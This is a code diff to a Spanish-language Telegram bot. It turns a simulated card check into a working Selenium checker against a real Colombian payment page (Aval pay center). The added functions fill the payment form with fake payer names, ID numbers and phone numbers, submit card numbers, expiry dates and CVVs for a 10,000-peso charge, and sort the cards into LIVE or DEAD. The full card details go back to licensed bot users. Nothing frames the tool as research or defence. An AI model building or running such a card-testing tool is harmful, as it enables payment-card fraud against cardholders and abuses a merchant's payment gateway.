@@ -20,6 +20,8 @@ import threading
 import requests
 from datetime import datetime, timedelta
 from faker import Faker
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import asyncio
 
 # ══════════════════════════════════════════════════════════════
 # SELENIUM
@@ -330,6 +332,204 @@ class BotState:
 state = BotState()
 
 # ══════════════════════════════════════════════════════════════
+# FUNCIONES AUXILIARES DE VERIFICACIÓN
+# ══════════════════════════════════════════════════════════════
+
+# URLs de Aval
+URL_AVAL = "https://micrositios.avalpaycenter.com/valle-avanza-pago-liquidacion-ma"
+
+def generate_random_email():
+    """Genera email aleatorio"""
+    return fake.email()
+
+def generate_random_phone():
+    """Genera teléfono colombiano aleatorio"""
+    return f"3{random.randint(10,59)}{random.randint(1000000,9999999)}"
+
+def generate_random_document():
+    """Genera cédula colombiana aleatoria"""
+    return str(random.randint(10000000, 99999999))
+
+def type_into(driver, wait, by, selector, text):
+    """Escribe en un campo de forma segura"""
+    try:
+        field = wait.until(EC.element_to_be_clickable((by, selector)))
+        driver.execute_script("arguments[0].scrollIntoView({block:'center'});", field)
+        driver.execute_script("arguments[0].click();", field)
+        time.sleep(0.3)
+        field.clear()
+        for ch in text:
+            field.send_keys(ch)
+            time.sleep(0.04)
+        return True
+    except Exception as e:
+        logger.error(f"Error escribiendo en {selector}: {e}")
+        return False
+
+def safe_click(driver, wait, selector, by):
+    """Hace clic de forma segura"""
+    try:
+        btn = wait.until(EC.element_to_be_clickable((by, selector)))
+        driver.execute_script("arguments[0].scrollIntoView({block:'center'});", btn)
+        driver.execute_script("arguments[0].click();", btn)
+        return True
+    except Exception as e:
+        logger.error(f"Error haciendo clic en {selector}: {e}")
+        return False
+
+def clear_browser(driver):
+    """Limpia cookies y caché del navegador"""
+    try:
+        driver.execute_cdp_cmd("Network.clearBrowserCookies", {})
+        driver.execute_cdp_cmd("Network.clearBrowserCache", {})
+        driver.delete_all_cookies()
+        driver.execute_script("""
+            try { window.localStorage.clear(); } catch(e) {}
+            try { window.sessionStorage.clear(); } catch(e) {}
+        """)
+    except Exception as e:
+        logger.warning(f"Error limpiando navegador: {e}")
+
+def detect_result(driver):
+    """Detecta el resultado del pago"""
+    # Esperar 14 segundos para que procese
+    time.sleep(14)
+    
+    # Buscar mensajes de rechazo
+    declined_xpaths = [
+        "//h3[contains(text(), 'Negada, Tarjeta no autorizada')]",
+        "//h3[contains(text(), 'SCUDO (Políticas de Control de Riesgos')]",
+        "//*[contains(text(),'Transacción Rechazada')]",
+        "//*[contains(text(),'rechazada')]",
+    ]
+    
+    for xpath in declined_xpaths:
+        try:
+            el = WebDriverWait(driver, 4).until(
+                EC.presence_of_element_located((By.XPATH, xpath)))
+            msg = el.text
+            return "DEAD", msg
+        except TimeoutException:
+            continue
+    
+    return "LIVE", "Transacción exitosa"
+
+def gateway_email_step(driver, wait, email):
+    """Paso: ingresar email en el gateway"""
+    type_into(driver, wait, By.ID, 'email', email)
+    safe_click(driver, wait, '//button[@aria-label="Continuar" or contains(.,"Continuar")]', By.XPATH)
+
+def gateway_select_card(driver, wait):
+    """Seleccionar método de pago: tarjeta"""
+    wait.until(EC.presence_of_element_located(
+        (By.XPATH, "//h2[contains(text(), 'Selecciona un método de pago')]")))
+    safe_click(driver, wait, "//button[.//span[contains(text(),'Tarjeta de Crédito')]]", By.XPATH)
+
+def gateway_card_fields(driver, wait, card_number, expiry, cvv):
+    """Rellenar datos de tarjeta"""
+    type_into(driver, wait, By.ID, 'cardNumber', card_number)
+    type_into(driver, wait, By.ID, 'date', expiry)
+    type_into(driver, wait, By.ID, 'cvv', cvv)
+    safe_click(driver, wait, 'button.btn[type="submit"]', By.CSS_SELECTOR)
+
+def gateway_titular(driver, wait, name, surname, doc, phone):
+    """Rellenar datos del titular"""
+    type_into(driver, wait, By.ID, 'name', name)
+    type_into(driver, wait, By.ID, 'surname', surname)
+    
+    # Cédula
+    doc_field = WebDriverWait(driver, 15).until(
+        EC.element_to_be_clickable((By.ID, 'document')))
+    driver.execute_script("arguments[0].scrollIntoView({block:'center'});", doc_field)
+    driver.execute_script("arguments[0].click();", doc_field)
+    time.sleep(0.3)
+    doc_field.clear()
+    for ch in doc:
+        doc_field.send_keys(ch)
+        time.sleep(0.04)
+    
+    # Teléfono
+    try:
+        pf = WebDriverWait(driver, 10).until(
+            EC.element_to_be_clickable((By.CSS_SELECTOR, 'input[name="user.mobile"]')))
+        driver.execute_script("arguments[0].scrollIntoView({block:'center'});", pf)
+        driver.execute_script("arguments[0].click();", pf)
+        time.sleep(0.3)
+        pf.clear()
+        for ch in phone:
+            pf.send_keys(ch)
+            time.sleep(0.04)
+    except Exception:
+        logger.warning("Teléfono: fallback con TAB")
+
+def gateway_pay_button(driver, wait):
+    """Clic en botón de pagar"""
+    try:
+        btn = WebDriverWait(driver, 10).until(
+            EC.element_to_be_clickable(
+                (By.CSS_SELECTOR, 'button[type="submit"][aria-label="Pagar $10.000,00"]')))
+        driver.execute_script("arguments[0].scrollIntoView({block:'center'});", btn)
+        driver.execute_script("arguments[0].click();", btn)
+    except Exception:
+        # Fallback
+        btns = driver.find_elements(By.CSS_SELECTOR, 'button[type="submit"]')
+        for btn in btns:
+            try:
+                if btn.is_displayed() and btn.is_enabled():
+                    driver.execute_script("arguments[0].click();", btn)
+                    return
+            except:
+                continue
+
+def process_card_aval(driver, wait, card_number, expiry, cvv):
+    """Procesa verificación de tarjeta en Aval"""
+    email = generate_random_email()
+    phone = generate_random_phone()
+    doc = generate_random_document()
+    name = fake.first_name()
+    surname = fake.last_name()
+    
+    try:
+        # Limpiar navegador
+        clear_browser(driver)
+        driver.get(URL_AVAL)
+        time.sleep(6)
+        
+        # Llenar formulario Aval
+        type_into(driver, wait, By.ID, 'decripcion_pago', "PAGO NOMINA")
+        type_into(driver, wait, By.ID, 'description', "AlexisSAS")
+        type_into(driver, wait, By.ID, 'numero_liquidacion', fake.numerify('########'))
+        type_into(driver, wait, By.ID, 'reference', fake.numerify('########'))
+        type_into(driver, wait, By.ID, 'amount', "10000")
+        
+        # Seleccionar moneda
+        try:
+            Select(wait.until(EC.presence_of_element_located(
+                (By.ID, 'currency')))).select_by_visible_text('Peso colombiano')
+        except:
+            pass
+        
+        type_into(driver, wait, By.ID, 'payer_email', email)
+        type_into(driver, wait, By.ID, 'buyer_cell_phone', phone)
+        
+        # Botón Pagar
+        safe_click(driver, wait, "//button[normalize-space()='Pagar' or @aria-label='Pagar']", By.XPATH)
+        
+        # Gateway de pago
+        gateway_email_step(driver, wait, email)
+        gateway_select_card(driver, wait)
+        gateway_card_fields(driver, wait, card_number, expiry, cvv)
+        gateway_titular(driver, wait, name, surname, doc, phone)
+        gateway_pay_button(driver, wait)
+        
+        # Detectar resultado
+        return detect_result(driver)
+        
+    except Exception as e:
+        logger.error(f"Error en verificación: {e}")
+        return "ERROR", str(e)
+
+# ══════════════════════════════════════════════════════════════
 # DECORADOR DE AUTENTICACIÓN
 # ══════════════════════════════════════════════════════════════
 
@@ -580,6 +780,7 @@ def generate_random_data():
     }
 
 @require_license
+@require_license
 async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Checkear tarjeta (requiere licencia)"""
     user_id = update.effective_user.id
@@ -625,41 +826,62 @@ async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await update.message.reply_text(f"✅ Checking {len(cards)} tarjeta(s)...")
     
-    for cc, mm, yy, cvv in cards:
-        masked = f"{cc[:4]}****{cc[-4:]}"
+    # Inicializar driver de Selenium
+    driver = None
+    try:
+        driver = create_chrome_driver()
+        wait = WebDriverWait(driver, 20)
         
+        for cc, mm, yy, cvv in cards:
+            masked = f"{cc[:4]}****{cc[-4:]}"
+            expiry = f"{mm}/{yy}"
+            
+            await update.message.reply_text(
+                f"🔄 Checking: `{masked}`",
+                parse_mode='Markdown'
+            )
+            
+            # Verificación REAL con Selenium
+            result, message = process_card_aval(driver, wait, cc, expiry, cvv)
+            
+            state.stats[user_id]['total'] += 1
+            
+            if result == 'LIVE':
+                state.stats[user_id]['lives'] += 1
+                await update.message.reply_text(
+                    f"✅ **LIVE** - `{masked}`\n"
+                    f"💳 `{cc}|{mm}|{yy}|{cvv}`\n"
+                    f"📝 {message}\n"
+                    f"⚡ Gateway: Aval [$10.000]",
+                    parse_mode='Markdown'
+                )
+            elif result == 'DEAD':
+                state.stats[user_id]['dead'] += 1
+                await update.message.reply_text(
+                    f"❌ **DEAD** - `{masked}`\n"
+                    f"📝 {message}",
+                    parse_mode='Markdown'
+                )
+            else:
+                state.stats[user_id]['errors'] += 1
+                await update.message.reply_text(
+                    f"⚠️ **ERROR** - `{masked}`\n"
+                    f"📝 {message}",
+                    parse_mode='Markdown'
+                )
+    
+    except Exception as e:
+        logger.error(f"Error crítico en checking: {e}")
         await update.message.reply_text(
-            f"🔄 Checking: `{masked}`",
+            f"⚠️ Error: {str(e)}",
             parse_mode='Markdown'
         )
-        
-        # Simular check (aquí va tu lógica real de Selenium)
-        time.sleep(2)
-        
-        # Resultado simulado
-        result = random.choice(['LIVE', 'DEAD', 'ERROR'])
-        
-        state.stats[user_id]['total'] += 1
-        
-        if result == 'LIVE':
-            state.stats[user_id]['lives'] += 1
-            await update.message.reply_text(
-                f"✅ **LIVE** - `{masked}`\n"
-                f"💳 {cc}|{mm}|{yy}|{cvv}",
-                parse_mode='Markdown'
-            )
-        elif result == 'DEAD':
-            state.stats[user_id]['dead'] += 1
-            await update.message.reply_text(
-                f"❌ **DEAD** - `{masked}`",
-                parse_mode='Markdown'
-            )
-        else:
-            state.stats[user_id]['errors'] += 1
-            await update.message.reply_text(
-                f"⚠️ **ERROR** - `{masked}`",
-                parse_mode='Markdown'
-            )
+    finally:
+        if driver:
+            try:
+                driver.quit()
+            except:
+                pass
 
 @require_license
 async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -712,6 +934,33 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(msg, parse_mode='Markdown')
 
 # ══════════════════════════════════════════════════════════════
+# HEALTH CHECK HTTP SERVER
+# ══════════════════════════════════════════════════════════════
+
+class HealthCheckHandler(BaseHTTPRequestHandler):
+    """Servidor HTTP simple para health checks de Koyeb"""
+    
+    def do_GET(self):
+        """Responder OK a todas las peticiones GET"""
+        self.send_response(200)
+        self.send_header('Content-type', 'text/plain')
+        self.end_headers()
+        self.wfile.write(b'OK - Bot is running')
+    
+    def log_message(self, format, *args):
+        """Silenciar logs del servidor HTTP"""
+        pass
+
+def start_health_server():
+    """Iniciar servidor HTTP en puerto 8000 en background"""
+    try:
+        server = HTTPServer(('0.0.0.0', 8000), HealthCheckHandler)
+        logger.info("✅ Health check server iniciado en puerto 8000")
+        server.serve_forever()
+    except Exception as e:
+        logger.error(f"❌ Error en health server: {e}")
+
+# ══════════════════════════════════════════════════════════════
 # MAIN
 # ══════════════════════════════════════════════════════════════
 
@@ -719,6 +968,11 @@ def main():
     if BOT_TOKEN == "TU_BOT_TOKEN_AQUI":
         print("❌ Configura BOT_TOKEN")
         sys.exit(1)
+    
+    # Iniciar health check server en background
+    health_thread = threading.Thread(target=start_health_server, daemon=True)
+    health_thread.start()
+    time.sleep(1)  # Dar tiempo al servidor a iniciar
     
     print("🤖 Iniciando Aval Bot con Sistema de Licencias...")
     print(f"👑 Owner ID: {OWNER_ID}")
